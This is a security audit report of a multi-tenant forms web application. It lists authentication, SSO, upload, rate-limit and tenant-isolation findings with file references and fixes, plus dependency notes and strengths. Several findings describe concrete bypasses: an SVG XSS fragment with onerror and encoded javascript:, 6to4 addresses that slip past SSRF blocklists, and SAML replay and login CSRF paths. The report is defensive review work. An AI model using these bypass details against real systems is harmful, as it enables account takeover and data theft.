| L1 | `auth/router.py:219` | `per_value("login", email, 10 / 10 min)` runs before the password is checked, and social and SSO sign-in share the bucket: anyone who knows an email can keep that person locked out | Count failures only, per (email, IP range), with a separate higher ceiling |
| L2 | `auth/router.py:236`, `core/security/passwords.py:340` | For social-only accounts (`password_hash` is None) `verify_password` returns at once: timing shows such an account exists | Verify against `DUMMY_HASH` when the hash is empty |
| L3 | `auth/router.py:503-518` | "Forgot password" sends mail only for real accounts, inside the request: timing tells known from unknown emails | Send after commit or in a task; do the same work for unknown addresses |
| L4 | `auth/router.py:310-323` | OTP resend does not check that the challenge belongs to the current host's workspace: a victim's code can be re-sent in another workspace's branding and mail route | Refuse with FRM-AUTH-1003 when `challenge.tenant_id` differs |
| L5 | `auth/sessions.py:126-149`, `auth/router.py:99-110` | Refresh rotation reads the token row without `FOR UPDATE` (two parallel refreshes both win); recovery codes can be raced; a TOTP code can be replayed within its window | `UPDATE ... WHERE used_at IS NULL RETURNING`; remember the last TOTP step per user |
| L6 | `auth/oauth.py:102-124`, `sso/flows.py:65-75` | Social and SSO state is not tied to the browser that started the flow (login CSRF; with sign-up, the victim builds a workspace in the attacker's account) | A short-lived HttpOnly SameSite=Lax cookie with a hash of the state, checked at the callback |
| L7 | `auth/router.py:684-688, 735-738` | The social or SSO identity link is saved when the code is *sent*, not when it is verified | Keep provider and subject in the challenge; link after success |
| L8 | `sso/flows.py:97`; python3-saml `response.py:123-125` | `wantAssertionsSigned: False`; InResponseTo is only checked when present; assertion ids are not remembered (replay within the validity window; the second step still applies) | Require InResponseTo equal to the state's request id; `SET NX` the assertion id until `NotOnOrAfter`; sign assertions |
| L9 | `uploads/service.py:38-39, 56-58` | The SVG filter regex misses `<image/onerror=...>` and entity-encoded `javascript:`; today the `sandbox` CSP on `/files/{ref}` saves it | Sanitise properly or rasterise; serve user files from a cookieless domain |
| L10 | `responses/files.py:94-100`, `uploads/service.py:129-137` | Respondent files are served inline with the type the respondent declared (for example `text/html`), and the 5-minute link can be reused although §4 calls it single use | Inline only for `PREVIEWABLE` types, otherwise attachment; `sandbox` CSP on every file; a single-use nonce |
| L11 | `responses/exports.py` (about 330), `explorer/exports.py` (about 248-257), `core/middleware/tenant.py:96-104`, `responses/files.py:81-84` | Export and file links: single use fails open when Redis is down; the datasource export ignores `deleted_at`; a `localhost` or IP Host skips the same-workspace check in production too | Fail closed; check `deleted_at`; allow "local" only when `is_development` |
| L12 | `explorer/exports.py:172-177, 235` | The remote table name goes unescaped into `Content-Disposition` (a `"` breaks it, non-Latin-1 gives a 500) | ASCII-safe `filename=` plus `filename*=UTF-8''...`, as `responses/files.py:96` does |
| L13 | `data_sources/connect.py:117-119` | SSH tunnels use `known_hosts=None`: a machine in the path can read the tunnelled database password | Pin the host key at the first successful test |
| L14 | `core/middleware/rate_limit.py:170-182`, `core/security/limits.py:59-62` | The sliding window counts and adds in two round trips (parallel bursts pass); route limits always fail open when Redis is down | One Lua script; fail closed for auth and code routes |
| L15 | `public/router.py:112-131`, DEPLOYMENT-GUIDE Nginx | `/api/v1/internal/public-forms/{key}` is plaintext and not blocked by Nginx (which only denies `/internal/`); it is guarded by `INTERNAL_TOKEN` and returns public data | `location /api/v1/internal/ { return 404; }`, or remove the route now that the front end is a static SPA |
| L16 | `alembic/versions/0002_request_logs.py:119-120` | `request_logs` INSERT policy for `formalie_app` is `WITH CHECK (true)`: app code in one workspace can write rows for another | Limit the INSERT to the worker role, or check `tenant_id` against the context |
| L17 | `core/security/fernet_tokens.py:18-41` | One Fernet keyring signs access, CSRF, link and gateway tokens **and** encrypts stored credentials (SMTP, SSO, data source, TOTP secrets): one leaked key does both, and they cannot be rotated apart | Separate keyrings, or HKDF-derived keys per purpose |
| L18 | `core/db/engines.py:38-46` | Engines are created without `hide_parameters=True`, so SQL errors in logged stack traces include bound values (personal data, hashes, ciphertexts) | `create_async_engine(..., hide_parameters=True)` |
| L19 | `responses/after.py:100-104`, `public/router.py:217-241` | The receipt mail goes to whatever address a respondent types (attacker text, the workspace's domain, no unsubscribe link); verification codes go to any address (5 per hour per form and address) | A per-recipient daily cap across forms, a suppression list, receipts after verification |
| L20 | `settings/schemas.py:164-166` | Control characters are allowed in `sender_name` and footer. Not header injection (`EmailMessage` refuses CR/LF), but every workspace mail then fails and is lost after 6 retries | Refuse `[\x00-\x1f\x7f]` in single-line settings |
| L21 | `api_service/gateway.py:370-391` | Before the token is checked, unknown endpoint names answer FRM-API-1006 (endpoint names can be listed for a known key) and access-rule refusals echo the rule's value | Check the token first, or answer uniformly; drop rule values from public errors |
| L22 | `emails/unsubscribe.py:66-69` | The unsubscribe token carries the raw tenant UUID and the address (signed, so nobody can unsubscribe someone else), against SECURITY-PROTOCOL §10 | An encrypted reference or an opaque id |

---

## Info

- **I1.** CSRF is not bound to the session as §6 says. `csrf_session()` is never called, and `/auth/csrf` has no `require_auth`, so `s` is always empty (`core/security/csrf.py:24-34`, `platform/router.py:84-91`). The envelope (host-bound key, nonce, method and path) and the bearer header already stop cross-site requests, so fix the doc or bind it.
- **I2.** `POST /crypto/handshake` stores a 30-minute Redis key per call, limited only by the 600 per minute IP tier. Watch Redis memory, or lower the TTL until first use.
- **I3.** There are three blocklists: `outbound.blocked`, `webhooks/tasks._blocked` with `rules.PRIVATE`, and `data_sources._blocked_ip`. None refuses 6to4 `2002::/16` (for example `2002:7f00:1::` embeds 127.0.0.1) or 192.88.99/24, and the webhook one misses 198.18/15. Use one function with `not ip.is_global`.
- **I4.** API tokens and client secrets are stored reversibly (`secret_enc`; reveal needs the password and is audited, `tokens_router.py:73, 219-233`), while §9 says "stored as a hash". Update the doc or drop the reveal.
- **I5.** The local file store writes plain bytes (`core/storage.py:27-33`), while §4 says files are encrypted at rest. Fine if the production disk or object store encrypts; say so in the doc.
- **I6.** The Nginx `api.` server block has no `client_max_body_size`, so gateway uploads above 1 MB get 413.
- **I7.** API "domain" access rules use `Origin` / `Referer`, which any non-browser client sets freely. Document them as a browser convenience, not a control.
- **I8.** SMTP with `security = none` and a username sends the workspace's credentials in clear (`emails/settings_router.py:257`, `sending.py:216`). Refuse AUTH without TLS.
- **I9.** Rendered emails, including codes and personal links, travel as Celery task arguments through RabbitMQ (`emails/service.py:142`), and Flower shows task arguments. Use broker TLS and credentials; never expose Flower without auth (see the observability plan).
- **I10.** The defaults in `config.py` (RabbitMQ `guest:guest`, Redis without a password, `docs_enabled=True`, dev certificate paths) are harmless only while M5 is fixed.
- **I11.** The shared join link's accept step answers FRM-USER-1011 for addresses already in the workspace (`people/invites.py:432-438`): someone holding the link can test addresses.
- **I12.** While the load test ran, every gateway call answered `500 FRM-GEN-5000` with an `ImportError` (`BLOCKED_STATUSES` missing from `app.core.middleware.tenant`). This comes from the other helper's work in progress, not from committed code; check it is gone before that work is committed.

## Dependencies

Read from `requirements.txt` and `requirements-dev.txt`, and checked against the installed packages in `fmly`.

- **Known CVEs:** none in the pinned versions, as far as known. The pins are past every fix known for python-multipart (ReDoS and boundary issues), Authlib (JWS / JWE issues), asyncssh (Terrapin), cryptography, httpx, celery / kombu, h11 (installed 0.16.0, past the chunked-encoding smuggling fix), starlette (installed 1.7.0) and jinja2 (installed 3.1.6).
- **C1 is not a CVE.** It is aiomysql 0.2.0 behaviour (the driver trusts the server's LOCAL INFILE request). It is fixed in our code, not by an upgrade.
- **Could not verify:** many pins are newer than the reviewer's knowledge: fastapi 0.143.0, uvicorn 0.54.0, SQLAlchemy 2.1.4, cryptography 50.0.2, redis 8.1.0, Authlib 1.8.0, lxml 6.1.3, xmlsec 1.3.17, python-multipart 0.0.32, PyMySQL 1.2.3, anthropic 1.13.0. Run `pip-audit -r requirements.txt` (a dev tool, needs the owner's approval to add) or check them against the GitHub Advisory Database before go-live.
- **Maintenance:**
  - python3-saml 1.16.0 has had no release since 2023 (keep xmlsec and lxml on the same libxml2, as requirements.txt notes).
  - oracledb 2.5.1 is a major version behind.
  - openpyxl is pinned but appears unused.
- **Reproducible installs:** starlette, h11, ua-parser and other transitive packages are not pinned. A lock file with hashes (`pip-compile --generate-hashes`) would make installs repeatable and safer.

## To check

1. **Cloudflare Worker and client IPs:** what does `CF-Connecting-IP` hold for portal calls the Worker proxies to `services.formalie.com`? If it is the Worker's address, every user shares one IP bucket and IP allowlists break.
2. **Authlib issuer check:** in `sso/flows.py:227`, when both `idp.issuer` and `oidc.issuer` are empty, the issuer check is probably skipped. Confirm discovery always stores `issuer`, or refuse when it is missing.
3. **OIDC `email_verified` and Facebook emails:** a missing `email_verified` claim is accepted, and the code falls back to `preferred_username` / `upn` (`flows.py:236-244`). Facebook's "verified" means only that an email is present (`oauth.py:158`). Fine for single-tenant issuers; confirm no connection can use a multi-tenant issuer.
4. **Custom security templates:** can a custom `password_reset` or `signin_code` text put `{{code}}` inside a link or image address, which would leak the code when the mail is opened?
5. **PgBouncer startup parameters:** `engines.py:26-37` sends `statement_timeout` and `search_path` as startup parameters. PgBouncer in transaction mode rejects or ignores them, so the 15 s limit may silently disappear in production. Set it per role in `db_bootstrap.py` too.
6. **Query editor memory:** results of up to 10,001 rows are held in memory with no byte cap (`runner.py:164`). A rogue database server can return huge rows.
7. **`request_logs.query` and headers:** whether decrypted query strings carry personal data (search terms, emails), since `platform_reader` can read them.
8. **oracledb thin options:** whether descriptor options (`HTTPS_PROXY`, wallet directory) are honoured. Whether a pymssql / FreeTDS host can name a `freetds.conf` alias, or SQL Browser (UDP 1434) runs before the address check.
9. **Front end and CDN:**
   - Whether the front end ever inlines uploaded SVGs, or rich-text links allow `javascript:`.
   - Whether the production CDN keeps the CSP and `nosniff` headers on `/files/{ref}`.
   - Whether the Worker sets per-form `frame-ancestors` for `/embed`.

## Done well

- **Envelope** (`core/middleware/envelope.py`):
  - strict shape check;
  - each key bound to its host;
  - ±60 s window, with a 120 s `SET NX` nonce;
  - AES-GCM with `kid|ts|nonce` as AAD;
  - method and path checked inside the ciphertext;
  - CSRF on every state-changing method;
  - errors sealed once the key is known.
- **Sessions** (`auth/sessions.py`):
  - access tokens checked against the session row on every call (instant revocation, idle and absolute limits, IP allowlist);
  - the token's workspace must match the host's (FRM-TEN-1003);
  - refresh tokens hashed, rotated, with family revocation on reuse;
  - the refresh cookie is HttpOnly, Secure, SameSite=Strict, host-only, path `/api/v1/auth`.
- **Passwords and codes:**
  - Argon2id, with a dummy hash for unknown emails, and the same answer for unknown email and wrong password;
  - 6-digit codes from `secrets`, stored hashed, compared in constant time;
  - tickets and OAuth / SSO state are single use (`GETDEL`) and hashed;
  - the support ticket is hashed, single use, and redeemed `FOR UPDATE`.
- **OAuth and SSO:**
  - PKCE for Google, `appsecret_proof` for Facebook;
  - no `next` parameter, and redirect hosts come from server-side state (no open redirect);
  - OIDC with PKCE, a nonce, an algorithm allowlist, and issuer, audience and expiry checks;
  - SAML in strict mode;
  - an SSO default role can never be Owner.
- **Tenant isolation:**
  - RLS set per transaction with `set_config(..., true)`, empty (fail closed) without a tenant;
  - ENABLE + FORCE with both `tenant_id` and `organisation_id` on all 69 tenant tables and on the log and outbox tables, inherited by partitions;
  - SECURITY DEFINER functions pin `search_path` and revoke from PUBLIC;
  - `formalie_worker` (BYPASSRLS) is limited to outbox, logs and partitions;
  - guarded by `tests/db/test_rls.py`.
- **SQL:**
  - every portal query is bound or uses allow-listed column and sort names;
  - customer-database identifiers are quoted per engine and values bound;
  - DDL names are checked.
- **Internal admin API:**
  - mTLS required in production;
  - HMAC-SHA256 over method, path, timestamp, nonce, body hash and staff headers, compared in constant time, 300 s window;
  - the nonce is stored only after the signature verifies, and calls are refused when Redis is down;
  - idempotency keys bound to the request hash.
- **Outbound HTTP** (`core/outbound.py`):
  - checks every resolved address and connects to the checked one, with SNI and Host kept;
  - no redirects, `trust_env=False`;
  - handles IPv4-mapped IPv6;
  - local addresses off in production;
  - SMTP pinned the same way, with TLS name checks.
- **Files and exports:**
  - storage keys made only from UUIDs, with a guard against escaping the store;
  - upload tickets are hashed, single use, 5 minutes, with exact size and real-bytes checks;
  - respondent files are never public;
  - `/downloads` links are single use in one atomic UPDATE;
  - CSV and XLSX protected against formula injection;
  - `nosniff` and a strict API CSP everywhere.
- **Email:**
  - no header injection (`EmailMessage` refuses CR/LF, subjects are collapsed);
  - every value in mail HTML is escaped;
  - sent and preview mail is shown in sandboxed iframes.
- **Gateway:**
  - tokens kept as SHA-256 and compared in constant time;
  - short-lived tokens are Fernet with workspace, token id and expiry;
  - test tokens see only sample data;
  - CORS gives the exact origin with `Vary: Origin`, no credentials, and unknown preflights refused;
  - `Authorization` is masked in logs.
- **Secrets:**
  - `SecretStr` throughout;
  - error replies carry codes only;
  - no `.env`, keys or certificates tracked in git (only `.env.example`, with empty secrets).
